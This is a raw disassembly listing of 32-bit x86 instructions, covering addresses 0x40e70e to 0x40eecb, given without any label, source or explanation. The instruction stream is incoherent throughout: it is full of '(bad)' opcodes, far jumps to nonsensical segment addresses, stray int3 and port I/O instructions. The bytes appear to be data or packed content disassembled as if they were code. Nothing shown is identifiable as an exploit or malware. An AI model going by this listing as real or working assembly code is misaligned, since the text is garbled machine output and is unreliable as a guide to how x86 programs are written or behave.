  40e70e:	add    BYTE PTR [edx],bh
  40e710:	inc    DWORD PTR [eax]
  40e712:	adc    edi,DWORD PTR [eax-0x346dff7d]
  40e718:	add    bh,bh
  40e71a:	jmp    DWORD PTR [edi-0xc000fe2]
  40e720:	dec    DWORD PTR [ecx-0x33332c51]
  40e726:	xor    dl,BYTE PTR [ebx+0x5b0000ff]
  40e72c:	in     eax,dx
  40e72d:	cmp    ecx,DWORD PTR [ecx-0x7a33ffe5]
  40e733:	cmp    eax,0x125c0083
  40e738:	add    DWORD PTR [ebx-0x4b85a601],0xffffffff
  40e73f:	blsic  eax,DWORD PTR [esi+0x5b53ff00]
  40e748:	add    BYTE PTR [eax],al
  40e74a:	jmp    FWORD PTR [eax-0x5f]
  40e74d:	cmp    al,0x0
  40e74f:	mov    bh,bh
  40e751:	jmp    ebx
  40e753:	adc    eax,0xf8ae00ff
  40e758:	dec    esp
  40e75a:	dec    esp
  40e75c:	ds inc ebx
  40e75e:	dec    DWORD PTR [edx-0x1]
  40e761:	(bad)  
  40e762:	mov    edi,0x4400ff79
  40e767:	push   0xf9ffff00
  40e76c:	jecxz  0x40e7c3
  40e76e:	call   FWORD PTR [edx+0xe380089]
  40e774:	cmp    edi,0xffffff81
  40e777:	data16 add bh,bh
  40e77a:	jmp    edx
  40e77c:	test   DWORD PTR [edi-0x34],esp
  40e77f:	xor    eax,DWORD PTR [ebx-0x7693ef00]
  40e785:	cmp    DWORD PTR [esi+0x830059],0x54
  40e78c:	sbb    ah,cl
  40e78e:	sbb    DWORD PTR [eax+0x0],0xffffff83
  40e792:	xchg   ebx,edi
  40e794:	inc    DWORD PTR [eax]
  40e796:	jb     0x40e732
  40e798:	(bad)  
  40e799:	inc    DWORD PTR [ebx-0x764abead]
  40e79f:	inc    DWORD PTR fs:[eax]
  40e7a2:	mov    eax,ds:0x9c830082
  40e7a7:	add    DWORD PTR es:[eax],0xffffffcc
  40e7ab:	sahf   
  40e7ac:	ins    BYTE PTR es:[edi],dx
  40e7ad:	sar    edi,0x5a
  40e7b0:	inc    DWORD PTR [eax]
  40e7b2:	sub    ah,BYTE PTR [edi+edi*8-0x359a01]
  40e7b9:	inc    DWORD PTR [eax]
  40e7bb:	mov    ds:0xc5ffe3c1,eax
  40e7c0:	mov    edi,edi
  40e7c2:	into   
  40e7c3:	in     eax,0x83
  40e7c5:	inc    DWORD PTR [edi]
  40e7c7:	fadd   DWORD PTR [eax]
  40e7c9:	inc    DWORD PTR [eax]
  40e7cb:	dec    esp
  40e7cc:	pop    ebp
  40e7cd:	mov    edi,0x89007700
  40e7d2:	cs test al,0xff
  40e7d5:	add    dh,ah
  40e7d7:	mov    ebp,0x87ff00ff
  40e7dc:	add    DWORD PTR [ebx],0xffffffff
  40e7df:	(bad)  
  40e7e0:	add    BYTE PTR [eax],al
  40e7e2:	loop   0x40e7f1
  40e7e4:	cmp    edi,0x61
  40e7e7:	add    eax,0x4700cc00
  40e7ec:	mov    DWORD PTR [eax+eax*1-0x5f000056],edi
  40e7f3:	(bad)  
  40e7f4:	(bad)  
  40e7f5:	(bad)  
  40e7f6:	cmp    esp,DWORD PTR [esi-0x6eff007d]
  40e7fc:	cmp    ecx,DWORD PTR [eax]
  40e7fe:	(bad)  
  40e7ff:	fiadd  WORD PTR [eax]
  40e801:	jmp    FWORD PTR [ebp-0x7e]
  40e804:	or     DWORD PTR [ecx-0x7cffe9e7],0xffffff83
  40e80b:	pop    ebp
  40e80c:	mov    ecx,0x8306ff68
  40e811:	xor    DWORD PTR [ebp-0x60],0xffffffff
  40e815:	int3   
  40e816:	jno    0x40e826
  40e818:	mov    edi,edi
  40e81a:	inc    eax
  40e81c:	lahf   
  40e81d:	jns    0x40e81e
  40e81f:	xchg   edx,eax
  40e820:	inc    DWORD PTR [ebx-0xfff0a2]
  40e826:	jecxz  0x40e803
  40e828:	inc    DWORD PTR [eax]
  40e82a:	call   DWORD PTR [edi-0x61]
  40e82d:	push   esi
  40e82e:	add    BYTE PTR [edx-0x607601],dh
  40e834:	int3   
  40e835:	int3   
  40e836:	xor    dh,ch
  40e838:	inc    DWORD PTR [eax]
  40e83a:	mov    DWORD PTR [edx+ebp*1-0x76d7ffaf],edx
  40e841:	and    DWORD PTR [esi+0x2dff0048],0x77
  40e848:	mov    edi,edi
  40e84a:	add    BYTE PTR [edi],dh
  40e84c:	lds    esp,FWORD PTR [ebx+eax*4-0x5c00000b]
  40e853:	cmp    edi,edi
  40e855:	add    BYTE PTR [edi-0x7c0076dd],al
  40e85b:	pop    ds
  40e85c:	outs   dx,DWORD PTR ds:[esi]
  40e85d:	mov    bh,0x0
  40e85f:	and    DWORD PTR [eax],eax
  40e861:	add    cl,al
  40e863:	and    bh,bh
  40e865:	int3   
  40e866:	(bad)  
  40e867:	sub    edi,edi
  40e869:	dec    DWORD PTR [ecx-0x2758bd]
  40e86f:	xchg   edx,eax
  40e870:	mov    edi,edi
  40e872:	loopne 0x40e8af
  40e874:	(bad)  
  40e875:	(bad)  
  40e876:	mov    ebx,0xff00ccd6
  40e87b:	mov    esp,0x2fff2dd1
  40e880:	mov    DWORD PTR [ebx-0x730],eax
  40e886:	clc    
  40e887:	pop    ebp
  40e888:	add    bh,bh
  40e88a:	inc    eax
  40e88c:	not    esp
  40e88e:	(bad)  
  40e88f:	cmp    edi,edi
  40e891:	dec    DWORD PTR [ebp-0x5d767c2c]
  40e897:	lods   eax,DWORD PTR ds:[esi]
  40e898:	(bad)  
  40e899:	(bad)  
  40e89a:	push   esi
  40e89c:	daa    
  40e89d:	mov    dh,0x0
  40e89f:	je     0x40e8a0
  40e8a1:	add    BYTE PTR [ecx+0x7eff00f8],dh
  40e8a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8a8:	cmp    edi,0x0
  40e8ab:	aam    0x70
  40e8ad:	add    eax,DWORD PTR [eax]
  40e8af:	sub    al,0x83
  40e8b1:	add    BYTE PTR [ecx+eiz*2+0x0],dl
  40e8b5:	add    BYTE PTR [eax],dl
  40e8b7:	mov    bh,bh
  40e8b9:	mov    edi,edi
  40e8bb:	loopne 0x40e8ab
  40e8bd:	out    dx,eax
  40e8be:	call   edx
  40e8c0:	int3   
  40e8c1:	call   ebp
  40e8c3:	mov    DWORD PTR [eax],0xffb83aff
  40e8c9:	add    BYTE PTR [eax],al
  40e8cb:	mov    ds:0x2d004212,al
  40e8d0:	inc    DWORD PTR [ebx-0xffc4e5]
  40e8d6:	xchg   esi,eax
  40e8d7:	into   
  40e8d8:	(bad)  
  40e8d9:	(bad)  
  40e8da:	push   ecx
  40e8dc:	mov    ebx,0x400039
  40e8e1:	mov    DWORD PTR [ebx-0x4a],ebp
  40e8e4:	inc    DWORD PTR [eax]
  40e8e6:	cs popa 
  40e8e8:	(bad)  
  40e8e9:	inc    DWORD PTR [eax]
  40e8eb:	cmp    DWORD PTR [edi-0x5f],ebx
  40e8ee:	sbb    DWORD PTR [edi-0x4ae4007d],0xffffff89
  40e8f5:	add    BYTE PTR [ecx-0xff001f],al
  40e8fb:	jb     0x40e886
  40e8fd:	(bad)  
  40e8ff:	adc    eax,DWORD PTR [eax]
  40e901:	jmp    FWORD PTR [ecx+eax*1-0x940100]
  40e908:	add    BYTE PTR [ebx-0x597d2201],al
  40e90e:	cmp    DWORD PTR [ebx-0x1],0xffffffff
  40e912:	pop    ebx
  40e913:	int    0x83
  40e915:	(bad)  
  40e916:	jmp    0x40e8e1
  40e918:	add    BYTE PTR [eax],al
  40e91a:	sbb    DWORD PTR [eax-0xb],0xffffffb5
  40e91e:	add    BYTE PTR [edi+edi*8],ch
  40e921:	push   DWORD PTR [esi-0x9767c2d]
  40e927:	inc    ecx
  40e928:	add    bh,bh
  40e92a:	int3   
  40e92b:	cmp    BYTE PTR [eax],ah
  40e92d:	cmp    bh,0x32
  40e930:	dec    esp
  40e932:	dec    edi
  40e933:	add    edi,edi
  40e935:	add    dh,bl
  40e937:	loop   0x40e8c2
  40e939:	add    BYTE PTR [eax],al
  40e93b:	mov    ds:0x6b83711d,al
  40e940:	cmp    edi,0x19
  40e943:	mov    ebx,0x84718300
  40e948:	(bad)  
  40e949:	inc    DWORD PTR [ebx+0x6cdaf3]
  40e94f:	adc    bh,bh
  40e951:	add    BYTE PTR [ebx-0x600004d],dh
  40e957:	fild   DWORD PTR [eax]
  40e959:	(bad)  
  40e95a:	push   DWORD PTR [ecx+0x7ff3fa6]
  40e960:	inc    DWORD PTR [eax]
  40e962:	rol    DWORD PTR [esi-0x65fb7601],0xff
  40e969:	dec    esp
  40e96b:	add    DWORD PTR [edx+0x66],0x0
  40e96f:	adc    bh,bh
  40e971:	add    al,bh
  40e973:	stos   DWORD PTR es:[edi],eax
  40e974:	(bad)  
  40e975:	call   FWORD PTR [ebp-0xb]
  40e978:	cmp    edi,0xffffffcc
  40e97b:	mov    bl,0x4e
  40e97d:	or     DWORD PTR [ecx-0x1bffff11],0x54
  40e984:	cmp    edi,0x35
  40e987:	mov    eax,ds:0x8783ff83
  40e98c:	lea    ax,[eax]
  40e98f:	dec    ecx
  40e990:	add    ah,cl
  40e992:	aaa    
  40e993:	jg     0x40e994
  40e995:	push   edi
  40e997:	out    dx,eax
  40e998:	cmp    edi,0xffffffff
  40e99b:	repnz imul ebx,DWORD PTR [ebp-0x7d],0x2f
  40e9a0:	add    bh,bh
  40e9a2:	fild   DWORD PTR [ebx]
  40e9a4:	int3   
  40e9a5:	jmp    FWORD PTR [ebx]
  40e9a7:	test   eax,0xe9890000
  40e9ac:	sbb    ebp,ebx
  40e9ae:	add    BYTE PTR [eax],bl
  40e9b0:	dec    DWORD PTR [ecx+0x1aee]
  40e9b6:	and    eax,0xffd3
  40e9bb:	retf   0xfc9f
  40e9be:	sbb    ebp,0xffffffff
  40e9c1:	add    BYTE PTR [ecx-0x77007ca5],ch
  40e9c7:	or     edi,edi
  40e9c9:	mov    DWORD PTR [eax],eax
  40e9cb:	mov    esi,0x34000788
  40e9d0:	inc    DWORD PTR [eax]
  40e9d2:	push   0xfffffff9
  40e9d4:	add    bh,bh
  40e9d6:	or     eax,DWORD PTR [edi+edi*8+0x0]
  40e9da:	add    BYTE PTR [edx+ebx*4-0x3400fa],dh
  40e9e1:	or     DWORD PTR [eax-0x3eff0068],0x15
  40e9e8:	(bad)  
  40e9e9:	(bad)  
  40e9ea:	(bad)  
  40e9eb:	std    
  40e9ec:	inc    edi
  40e9ed:	(bad)  
  40e9ee:	inc    ebp
  40e9f0:	(bad)  
  40e9f1:	(bad)  
  40e9f2:	js     0x40ea1a
  40e9f4:	(bad)  
  40e9f5:	(bad)  
  40e9f6:	out    dx,eax
  40e9f7:	xchg   edi,edi
  40e9f9:	inc    DWORD PTR [eax]
  40e9fb:	sbb    BYTE PTR [ebp-0x4c],dh
  40e9fe:	int3   
  40e9ff:	iret   
  40ea00:	add    BYTE PTR [eax],al
  40ea02:	inc    ebp
  40ea03:	(bad)  
  40ea04:	int3   
  40ea05:	int3   
  40ea06:	dec    ebx
  40ea07:	adc    eax,0xd283ffff
  40ea0c:	hlt    
  40ea0d:	xchg   edx,eax
  40ea0e:	cmp    ebp,0xffffffcc
  40ea11:	jmp    DWORD PTR ds:0x3cff0070
  40ea17:	stos   BYTE PTR es:[edi],al
  40ea18:	(bad)  
  40ea19:	(bad)  
  40ea1a:	dec    DWORD PTR [ebx+0xfffbacf]
  40ea20:	int3   
  40ea21:	(bad)  
  40ea22:	jns    0x40ea67
  40ea24:	(bad)  
  40ea25:	call   DWORD PTR [edx-0x1f]
  40ea28:	inc    DWORD PTR [eax]
  40ea2a:	mov    DWORD PTR [edi+0x2fff0374],esp
  40ea30:	int3   
  40ea31:	call   FWORD PTR [edx-0x6]
  40ea34:	inc    DWORD PTR [ebx-0x325f]
  40ea3a:	(bad)  
  40ea3b:	push   DWORD PTR [ecx-0x57]
  40ea3e:	sub    DWORD PTR [eax-0x34],0xffffffcc
  40ea42:	pop    ebp
  40ea43:	and    eax,DWORD PTR [eax]
  40ea45:	call   DWORD PTR [ebx]
  40ea47:	add    eax,0x2f00ffff
  40ea4c:	mov    cl,bh
  40ea4e:	inc    DWORD PTR [ebx-0x17850001]
  40ea54:	(bad)  
  40ea55:	jmp    FWORD PTR [eax+0x75]
  40ea58:	dec    DWORD PTR [ecx-0x55c19401]
  40ea5e:	inc    DWORD PTR [eax+0x0]
  40ea61:	add    BYTE PTR [ebx+0x51],bh
  40ea64:	dec    esp
  40ea66:	xacquire lock add DWORD PTR [eax],0xffffff89
  40ea6b:	ins    BYTE PTR es:[edi],dx
  40ea6c:	jle    0x40ea53
  40ea6e:	jmp    ecx
  40ea70:	cmp    edi,0xffffffac
  40ea73:	mov    esp,ecx
  40ea75:	add    BYTE PTR [eax-0x760059],dh
  40ea7b:	dec    esp
  40ea7c:	xchg   ebp,eax
  40ea7d:	add    al,BYTE PTR [eax]
  40ea7f:	mov    ebx,0x82840083
  40ea84:	int3   
  40ea85:	(bad)  
  40ea86:	mov    esi,0xffccff9d
  40ea8b:	or     al,0xe7
  40ea8d:	jmp    0xd6ba:0x89891900
  40ea94:	inc    DWORD PTR [eax]
  40ea96:	jmp    0xac84:0xff000033
  40ea9d:	sbb    eax,0xff892ecc
  40eaa2:	out    dx,al
  40eaa3:	mov    al,0xff
  40eaa5:	call   esi
  40eaa7:	repnz inc DWORD PTR [eax]
  40eaaa:	dec    DWORD PTR [edi+0x11]
  40eaad:	mov    eax,DWORD PTR [eax]
  40eaaf:	pushf  
  40eab0:	cmp    edi,0x7d
  40eab3:	test   DWORD PTR [ebx-0x2c2d34],0x652600cc
  40eabd:	test   BYTE PTR [ebx-0x7f00ff79],al
  40eac3:	xor    eax,0xc329ff83
  40eac8:	inc    DWORD PTR [ebx-0x4f7aa400]
  40eace:	mov    DWORD PTR [ebx-0x1],ecx
  40ead1:	mov    ebx,ebx
  40ead3:	cwde   
  40ead4:	(bad)  
  40ead5:	push   edx
  40ead7:	push   0x56ff00ff
  40eadc:	push   ss
  40eadd:	xchg   ecx,eax
  40eade:	add    BYTE PTR [edi+edi*8],bh
  40eae1:	add    BYTE PTR [eax],bh
  40eae3:	xchg   ecx,eax
  40eae4:	add    DWORD PTR [ebx+0xfc6f],0x0
  40eaeb:	aad    0xb4
  40eaed:	or     eax,0xffd689
  40eaf2:	dec    ecx
  40eaf3:	pop    ebx
  40eaf4:	mov    edi,edi
  40eaf6:	pop    es
  40eaf7:	pusha  
  40eaf8:	(bad)  
  40eaf9:	inc    DWORD PTR [eax]
  40eafb:	adc    DWORD PTR [ecx+0xb9cc5b],esi
  40eb01:	add    BYTE PTR [esi+0x1c00cc6e],al
  40eb07:	jmp    0xbbd3:0xbffcc83
  40eb0e:	(bad)  
  40eb0f:	out    dx,al
  40eb10:	inc    DWORD PTR [eax]
  40eb12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb13:	or     DWORD PTR [ebx-0x7cd60400],eax
  40eb19:	inc    DWORD PTR [ebx+0x6c425e]
  40eb1f:	xlat   BYTE PTR ds:[ebx]
  40eb20:	add    BYTE PTR [ebx-0x7cd9b8],al
  40eb26:	(bad)  
  40eb27:	fild   DWORD PTR [eax]
  40eb29:	add    bh,bh
  40eb2b:	xor    DWORD PTR [eax+0x5a],edi
  40eb2e:	add    BYTE PTR [ebx-0x34],dh
  40eb31:	add    BYTE PTR [edx],al
  40eb33:	jns    0x40eb35
  40eb35:	inc    ebx
  40eb37:	adc    bh,bh
  40eb39:	inc    DWORD PTR [eax]
  40eb3b:	jmp    0x83cabb1d
  40eb40:	add    BYTE PTR [ebx-0x33bfba],al
  40eb46:	sar    BYTE PTR [edx],1
  40eb48:	add    bh,bh
  40eb4a:	add    BYTE PTR [ebx],al
  40eb4c:	adc    ecx,DWORD PTR [esp+ecx*8-0x2500ffd6]
  40eb53:	add    bh,bh
  40eb55:	inc    DWORD PTR [ebx+0x35]
  40eb58:	dec    esp
  40eb5a:	call   eax
  40eb5c:	mov    BYTE PTR [ebx+0xff3200],dl
  40eb62:	mov    WORD PTR [edi-0x19300100],gs
  40eb68:	add    bh,bh
  40eb6a:	add    bl,ch
  40eb6c:	addr16 adc al,0xff
  40eb6f:	push   0xffffffff
  40eb71:	push   DWORD PTR [edi+0x25]
  40eb74:	inc    DWORD PTR [eax]
  40eb76:	xor    ch,dh
  40eb78:	add    bh,bh
  40eb7a:	push   DWORD PTR [esi+0x0]
  40eb7d:	fwait
  40eb7e:	xor    DWORD PTR [eax+0x28f80083],0xffffffff
  40eb85:	add    BYTE PTR [eax],ch
  40eb87:	push   ds
  40eb88:	dec    esp
  40eb8a:	mov    DWORD PTR [eax+0x31004e9d],ebx
  40eb90:	add    bh,bh
  40eb92:	pushf  
  40eb93:	mov    ds:0x6e6f0083,al
  40eb98:	inc    DWORD PTR [eax]
  40eb9a:	add    BYTE PTR [ecx-0x40],al
  40eb9d:	or     al,0x0
  40eb9f:	push   ecx
  40eba0:	or     esp,0x2d
  40eba3:	lods   eax,DWORD PTR ds:[esi]
  40eba4:	inc    DWORD PTR [eax]
  40eba6:	cmp    dl,dh
  40eba8:	inc    DWORD PTR [eax]
  40ebaa:	int3   
  40ebab:	fst    DWORD PTR [ecx]
  40ebad:	add    BYTE PTR ss:0x1a46ffff,bh
  40ebb4:	(bad)  
  40ebb5:	inc    DWORD PTR [ebx+0xffff91]
  40ebbb:	dec    esi
  40ebbc:	jns    0x40ebf1
  40ebbe:	adc    DWORD PTR [ecx],0xffffffcc
  40ebc1:	jmp    DWORD PTR [ecx+0x3d]
  40ebc4:	(bad)  
  40ebc5:	call   FWORD PTR [eax]
  40ebc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebc8:	dec    esp
  40ebca:	jmp    esp
  40ebcc:	pushf  
  40ebcd:	push   es
  40ebce:	int3   
  40ebcf:	pop    es
  40ebd0:	mov    DWORD PTR [eax],eax
  40ebd2:	or     ah,0x0
  40ebd5:	add    BYTE PTR [esi-0x7c00002d],cl
  40ebdb:	xor    al,0x31
  40ebdd:	pop    ss
  40ebde:	jmp    DWORD PTR [ebp+0x0]
  40ebe1:	add    BYTE PTR [ecx+edi*2],bh
  40ebe4:	dec    esp
  40ebe6:	sbb    al,0xdf
  40ebe8:	mov    edi,edi
  40ebea:	and    DWORD PTR [ebx-0x6],0x14
  40ebee:	sbb    DWORD PTR [eax-0x2c360100],0xffffffff
  40ebf5:	add    BYTE PTR [ecx+0x29],bl
  40ebf8:	add    bh,bh
  40ebfa:	push   DWORD PTR [ebx]
  40ebfc:	pusha  
  40ebfd:	cld    
  40ebfe:	add    BYTE PTR [edi+edi*8+0x0],dl
  40ec02:	dec    eax
  40ec03:	ret    0xffcc
  40ec06:	inc    esp
  40ec07:	add    al,0xcc
  40ec09:	add    bh,bh
  40ec0b:	out    dx,eax
  40ec0c:	mov    ah,0x7f
  40ec0e:	call   DWORD PTR [ecx-0x1]
  40ec11:	inc    edi
  40ec13:	stc    
  40ec14:	inc    DWORD PTR [eax]
  40ec16:	adc    ah,BYTE PTR [esi-0x7d]
  40ec19:	add    BYTE PTR [eax],al
  40ec1b:	fsubr  QWORD PTR [ecx-0x3b]
  40ec1e:	mov    ebp,ecx
  40ec20:	add    DWORD PTR [eax],0x1
  40ec23:	mov    BYTE PTR [ebx-0x762bf17d],0xff
  40ec2a:	push   DWORD PTR [esp+ecx*8+0x8fff13]
  40ec31:	cmp    DWORD PTR [ebx+0x71],0xffffffff
  40ec35:	add    BYTE PTR [esi],bh
  40ec37:	nop
  40ec38:	dec    esp
  40ec3a:	(bad)  
  40ec3b:	aas    
  40ec3c:	repz push DWORD PTR cs:[ebp+0x4a61ffff]
  40ec44:	inc    DWORD PTR [eax]
  40ec46:	mov    cl,0x31
  40ec48:	add    BYTE PTR [eax],al
  40ec4a:	jmp    FWORD PTR [esp+eiz*2-0x13ff2b]
  40ec51:	inc    ecx
  40ec53:	push   esi
  40ec54:	(bad)  
  40ec55:	jmp    DWORD PTR [edx+0xf1]
  40ec5b:	sub    ebx,DWORD PTR [ecx+eiz*1-0x1]
  40ec5f:	add    BYTE PTR [eax],0x0
  40ec62:	cmp    eax,0x52ffcc07
  40ec67:	dec    esp
  40ec68:	add    BYTE PTR [eax],al
  40ec6a:	dec    DWORD PTR [edi]
  40ec6c:	sub    al,0xde
  40ec6e:	dec    DWORD PTR [esi+0x9e2ffff]
  40ec74:	add    bh,bh
  40ec76:	(bad)  
  40ec77:	in     al,dx
  40ec78:	mov    DWORD PTR [eax],eax
  40ec7a:	jmp    FWORD PTR [ecx]
  40ec7c:	int    0xae
  40ec7e:	add    BYTE PTR [edx],cl
  40ec80:	add    DWORD PTR [eax],0xe
  40ec83:	out    dx,eax
  40ec84:	(bad)  
  40ec85:	inc    DWORD PTR [edi-0xff5e]
  40ec8b:	push   0x56
  40ec8d:	repz (bad) 
  40ec8f:	jge    0x40ec91
  40ec91:	call   DWORD PTR [ecx+0x3effff21]
  40ec97:	cmp    bh,bh
  40ec99:	inc    DWORD PTR [eax]
  40ec9b:	pop    ds
  40ec9c:	mov    bl,0xc7
  40ec9e:	int3   
  40ec9f:	add    al,0xff
  40eca1:	or     DWORD PTR [esi+ebp*2-0x2ce00001],0xffffffff
  40eca9:	dec    esp
  40ecab:	add    al,0xf5
  40ecad:	test   edi,edi
  40ecaf:	pushf  
  40ecb0:	inc    DWORD PTR [eax]
  40ecb2:	(bad)  
  40ecb3:	loopne 0x40ecb4
  40ecb5:	(bad)  
  40ecb6:	fld    DWORD PTR [eax-0x4000767d]
  40ecbc:	test   ebx,eax
  40ecbe:	or     DWORD PTR [ebx],0xffffffff
  40ecc1:	add    BYTE PTR [edi+esi*2-0x7d],dl
  40ecc5:	or     esi,0x49
  40ecc8:	inc    DWORD PTR [eax]
  40ecca:	inc    DWORD PTR [ebp-0x77]
  40eccd:	push   eax
  40ecce:	mov    DWORD PTR [edi+edi*8-0x76f17e77],ebp
  40ecd5:	call   DWORD PTR [edx-0xff00be]
  40ecdb:	sti    
  40ecdc:	fdivr  DWORD PTR [ebp-0x33a400]
  40ece2:	mov    esi,0x90ccff2f
  40ece7:	ss int3 
  40ece9:	cmp    edi,0x3b
  40ecec:	stc    
  40eced:	add    eax,DWORD PTR [ebx+0x6bff00aa]
  40ecf3:	jl     0x40ecf4
  40ecf5:	add    BYTE PTR [esi+0x33],cl
  40ecf8:	add    BYTE PTR [ebx+0x6fdaab00],al
  40ecfe:	adc    DWORD PTR [ebp+0x258eff00],0x0
  40ed05:	add    BYTE PTR [edx],cl
  40ed07:	mov    bh,0xff
  40ed09:	dec    esp
  40ed0b:	aaa    
  40ed0c:	push   cs
  40ed0d:	mov    bl,0x89
  40ed0f:	mov    esp,0xca9983ff
  40ed14:	inc    DWORD PTR [ebx-0x33ffdafa]
  40ed1a:	jmp    DWORD PTR [ecx]
  40ed1c:	out    0x47,al
  40ed1e:	add    ch,bl
  40ed20:	add    bh,bh
  40ed22:	mov    dh,BYTE PTR [edx-0x77]
  40ed25:	push   ecx
  40ed27:	pop    esi
  40ed28:	int3   
  40ed29:	add    BYTE PTR [eax],al
  40ed2b:	adc    BYTE PTR [edx],bl
  40ed2d:	ror    DWORD PTR [ecx+0x3ff83e3],1
  40ed33:	xor    DWORD PTR [eax],eax
  40ed35:	add    dl,al
  40ed37:	mov    bh,bh
  40ed39:	inc    DWORD PTR [eax]
  40ed3b:	xor    al,0x90
  40ed3d:	dec    esi
  40ed3e:	jmp    DWORD PTR [ecx]
  40ed40:	add    ah,cl
  40ed42:	pop    ebp
  40ed43:	lods   al,BYTE PTR ds:[esi]
  40ed44:	mov    edi,edi
  40ed46:	add    DWORD PTR [edi+edi*8],ebp
  40ed49:	inc    DWORD PTR [eax]
  40ed4b:	inc    edi
  40ed4c:	mov    ebp,0xbffce
  40ed51:	add    BYTE PTR [ebp-0x62],al
  40ed54:	add    ah,cl
  40ed56:	dec    eax
  40ed57:	push   es
  40ed58:	add    BYTE PTR [ecx+0x4307e000],cl
  40ed5e:	add    DWORD PTR [ecx+ecx*4-0x76f6d001],0x0
  40ed66:	xchg   DWORD PTR [ebp+0x0],eax
  40ed69:	inc    DWORD PTR [eax]
  40ed6b:	es pusha 
  40ed6d:	loopne 0x40ecf2
  40ed6f:	jb     0x40ed71
  40ed71:	add    dl,ah
  40ed73:	jle    0x40ecfe
  40ed75:	push   DWORD PTR [ecx+0xccff18]
  40ed7b:	push   ecx
  40ed7c:	jmp    0xc6ff:0x83aafffe
  40ed83:	push   0x5a9e00ff
  40ed88:	inc    DWORD PTR [ebx-0x8f04c01]
  40ed8e:	add    DWORD PTR [edx+0x0],0x0
  40ed92:	mov    ebx,DWORD PTR [esi]
  40ed94:	cmp    edi,0x2
  40ed97:	mov    edi,0x96ffffff
  40ed9c:	jne    0x40ed21
  40ed9e:	add    BYTE PTR [eax+eax*1],cl
  40eda1:	mov    ebx,ebp
  40eda3:	lods   eax,DWORD PTR ds:[esi]
  40eda4:	add    ah,cl
  40eda6:	ds add eax,0x2dffffff
  40edac:	loopne 0x40ee0e
  40edae:	add    BYTE PTR [edi-0x1],al
  40edb1:	sub    DWORD PTR [ebx],0xffffff98
  40edb4:	add    BYTE PTR [eax],al
  40edb6:	sbb    DWORD PTR [ecx-0x7d],0xffffffcc
  40edba:	inc    ebp
  40edbc:	pop    esi
  40edbd:	test   BYTE PTR [eax],al
  40edbf:	(bad)  
  40edc0:	inc    DWORD PTR [eax]
  40edc2:	stos   DWORD PTR es:[edi],eax
  40edc3:	test   BYTE PTR [eax],al
  40edc5:	inc    DWORD PTR [ecx]
  40edc7:	and    bh,bh
  40edc9:	(bad)  
  40edca:	jmp    DWORD PTR [ecx+0x4600688c]
  40edd0:	add    bh,bh
  40edd2:	or     al,0x9a
  40edd4:	inc    DWORD PTR [eax]
  40edd6:	jle    0x40ed73
  40edd8:	inc    DWORD PTR [eax]
  40edda:	int3   
  40eddb:	scas   eax,DWORD PTR es:[edi]
  40eddc:	inc    ecx
  40eddd:	jmp    0x8a40a0e2
  40ede2:	sbb    eax,0xb2830004
  40ede7:	xor    al,0x0
  40ede9:	inc    DWORD PTR [ebx-0x7c0b11eb]
  40edef:	jnp    0x40edf0
  40edf1:	jmp    DWORD PTR [esi+0x2b]
  40edf4:	inc    DWORD PTR [eax]
  40edf6:	scas   al,BYTE PTR es:[edi]
  40edf7:	add    BYTE PTR gs:[ebx+0x40b0e4ff],al
  40edfe:	call   FWORD PTR [eax]
  40ee00:	add    BYTE PTR [eax],al
  40ee02:	arpl   WORD PTR [edx-0x1],bp
  40ee05:	mov    ebx,esp
  40ee07:	sbb    edi,edi
  40ee09:	inc    DWORD PTR [eax]
  40ee0b:	mov    dl,0x60
  40ee0d:	xor    BYTE PTR [eax],al
  40ee0f:	push   es
  40ee10:	(bad)  
  40ee11:	(bad)  
  40ee12:	cmp    esp,DWORD PTR [esi]
  40ee14:	inc    DWORD PTR [eax]
  40ee16:	inc    edi
  40ee17:	aam    0x0
  40ee19:	add    bh,bh
  40ee1b:	push   cs
  40ee1c:	push   esp
  40ee1d:	xchg   ecx,eax
  40ee1e:	add    ah,al
  40ee20:	dec    DWORD PTR [ecx-0x76e2d0]
  40ee26:	push   ebx
  40ee27:	nop
  40ee28:	(bad)  
  40ee29:	inc    DWORD PTR [ebx-0x55ae93]
  40ee2f:	push   eax
  40ee30:	int3   
  40ee31:	int3   
  40ee32:	inc    ebx
  40ee33:	jmp    0x0:0xaec600ff
  40ee3a:	jmp    FWORD PTR [edi+0x9]
  40ee3d:	or     al,0x83
  40ee3f:	clc    
  40ee40:	cmp    edi,0x5
  40ee43:	inc    DWORD PTR es:[eax]
  40ee46:	pop    edx
  40ee47:	push   es
  40ee48:	inc    DWORD PTR [eax]
  40ee4a:	and    DWORD PTR [ebp+0x1e003b2f],0x0
  40ee51:	mov    edx,esi
  40ee53:	inc    edi
  40ee54:	inc    DWORD PTR [eax]
  40ee56:	jns    0x40ee89
  40ee58:	(bad)  
  40ee59:	inc    DWORD PTR [eax]
  40ee5b:	adc    cl,bh
  40ee5d:	icebp  
  40ee5e:	(bad)  
  40ee5f:	sti    
  40ee60:	mov    DWORD PTR [eax],eax
  40ee62:	add    BYTE PTR [edx+0x55318983],0x83
  40ee69:	inc    DWORD PTR [ebx+0x62eff9]
  40ee6f:	jle    0x40ee71
  40ee71:	inc    DWORD PTR [esp+eiz*4]
  40ee74:	inc    DWORD PTR [eax]
  40ee76:	mov    esi,0xcc00ff43
  40ee7b:	lods   al,BYTE PTR ds:[esi]
  40ee7c:	jns    0x40ee30
  40ee7e:	call   edi
  40ee80:	(bad)  
  40ee81:	jmp    FWORD PTR [edi]
  40ee83:	test   DWORD PTR [ebx-0x971c01],0x3893ccff
  40ee8d:	inc    esp
  40ee8e:	and    DWORD PTR [edi-0x478c7634],0xffffffff
  40ee95:	call   edi
  40ee97:	push   ecx
  40ee98:	int3   
  40ee99:	int3   
  40ee9a:	mov    DWORD PTR [ecx],esi
  40ee9c:	and    cl,BYTE PTR [ecx-0x1]
  40ee9f:	mov    edx,0xe380ff89
  40eea4:	mov    edi,edi
  40eea6:	lock imul edi,edi,0x512200cc
  40eead:	pop    ebp
  40eeae:	add    ah,dh
  40eeb0:	(bad)  
  40eeb1:	push   DWORD PTR [edx]
  40eeb3:	sbb    al,0xcc
  40eeb5:	(bad)  
  40eeb6:	fild   WORD PTR [eax-0x1]
  40eeb9:	(bad)  
  40eeba:	(bad)  
  40eebb:	clc    
  40eebc:	fs mov al,0x0
  40eebf:	xchg   edi,edi
  40eec1:	add    dh,ch
  40eec3:	mov    ah,0x0
  40eec5:	add    BYTE PTR [eax+0xccffdd],cl
  40eecb:	xor    eax,0xeaffa834
